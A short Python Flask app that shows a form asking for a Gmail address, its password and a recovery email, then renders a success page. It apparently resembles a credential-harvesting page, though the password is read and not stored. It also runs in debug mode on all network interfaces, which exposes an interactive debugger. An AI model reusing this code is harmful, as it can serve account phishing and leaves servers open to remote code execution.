from flask import Flask, render_template, request
import os  # Импортируем os для работы с переменными окружения

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def form():
    if request.method == "POST":
        gmail = request.form.get("gmail")
        password = request.form.get("password")
        recovery_email = request.form.get("recovery_email")
        return render_template("success.html", gmail=gmail, recovery_email=recovery_email)
    return render_template("form.html")

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
